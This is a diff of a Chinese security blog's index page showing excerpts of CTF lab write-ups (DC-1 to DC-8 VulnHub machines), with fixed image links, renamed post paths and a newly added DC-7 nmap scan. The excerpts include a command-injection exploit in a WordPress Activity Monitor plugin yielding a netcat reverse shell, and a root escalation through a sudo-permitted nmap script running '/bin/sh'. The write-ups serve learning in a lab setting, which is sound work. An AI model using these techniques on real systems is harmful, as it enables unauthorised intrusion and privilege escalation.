@@ -160,12 +160,12 @@
 <p>攻击机：Kali（IP：192.168.43.22）</p>
 <p>靶机：Debian GNU/Liux 9（IP：192.168.43.84）</p>
 <h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>拿到管理员账号进入后台之后，点击<code>Activity monitor -&gt; Tools</code>，输入参数后点击<code>Lookup</code>提交抓包</p>
-<p><img src alt="15877-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE/15877-1.png" alt="15877-1"></p>
 <p>修改<code>ip</code>参数，没有任何过滤地命令执行</p>
-<p><img src alt="15877-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE/15877-2.png" alt="15877-2"></p>
 <p>直接拿shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.43.84] from (UNKNOWN) [192.168.43.22] 58488</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/sh&apos;)&quot;</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
-<p><img src alt="15877-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE/15877-3.png" alt="15877-3"></p>
 <hr>
 <p>也可以利用<code>searchsploit</code>拿别人写好的<code>POC</code></p>
 <p><code>searchsploit</code>搜索关键词<code>wordpress activity monitor</code></p>
@@ -341,19 +341,19 @@
 
 
   
-    <article id="post-DC1-DC4系列靶机渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-DC1-DC4靶机渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/17/DC1-DC4系列靶机渗透测试/">渗透学习 — DC-1至DC-4靶机渗透测试</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/09/17/DC1-DC4靶机渗透测试/">渗透学习 — DC-1至DC-4靶机渗透测试</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/09/17/DC1-DC4系列靶机渗透测试/" class="archive-article-date">
+        <a href="/Knlvre.github-io/2019/09/17/DC1-DC4靶机渗透测试/" class="archive-article-date">
   	<time datetime="2019-09-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-17</time>
 </a>
         
@@ -653,7 +653,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/17/DC1-DC4系列靶机渗透测试/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/17/DC1-DC4靶机渗透测试/">展开全文 >></a>
         </p>
       
 
@@ -683,19 +683,19 @@
 
 
   
-    <article id="post-DC5-DC8系列靶机渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-DC5-DC8靶机渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/17/DC5-DC8系列靶机渗透测试/">渗透学习 — DC-5至DC-8靶机渗透测试</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/09/17/DC5-DC8靶机渗透测试/">渗透学习 — DC-5至DC-8靶机渗透测试</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/09/17/DC5-DC8系列靶机渗透测试/" class="archive-article-date">
+        <a href="/Knlvre.github-io/2019/09/17/DC5-DC8靶机渗透测试/" class="archive-article-date">
   	<time datetime="2019-09-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-17</time>
 </a>
         
@@ -844,6 +844,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ echo &apos;os.execute(&quot;/bin/sh&quot;)&apos; &gt; TE.nse</span><br><span class="line">jens@dc-6:~$ sudo nmap --script=/home/jens/TE.nse</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-09-26 11:25 AEST</span><br><span class="line"># python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;	#执行但没有回显</span><br><span class="line">root@dc-6:/home/jens# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
 <p>查找并查看flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@dc-6:/home/jens# find / -name *flag*</span><br><span class="line">...</span><br><span class="line">/root/theflag.txt</span><br><span class="line"></span><br><span class="line">root@dc-6:/home/jens# cat /root/theflag.txt</span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&apos; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
+<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+<p>攻击机：Kali（IP：192.168.43.84）</p>
+<p>靶机：DC-7（IP：192.168.43.29）</p>
+<h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描IP，开放<code>22</code>和<code>80</code>端口，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nmap -p- -A 192.168.43.29</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-27 09:36 CST</span><br><span class="line">Nmap scan report for bogon (192.168.43.29)</span><br><span class="line">Host is up (0.0035s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/ </span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ </span><br><span class="line">| /user/password/ /user/login/ /user/logout/ /index.php/admin/ </span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 00:0C:29:BB:F1:42 (VMware)</span><br><span class="line">Device type: general purpose</span><br></pre></td></tr></table></figure>
 
       
 
@@ -867,7 +872,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/17/DC5-DC8系列靶机渗透测试/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/17/DC5-DC8靶机渗透测试/">展开全文 >></a>
         </p>
       
 
@@ -1875,11 +1880,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
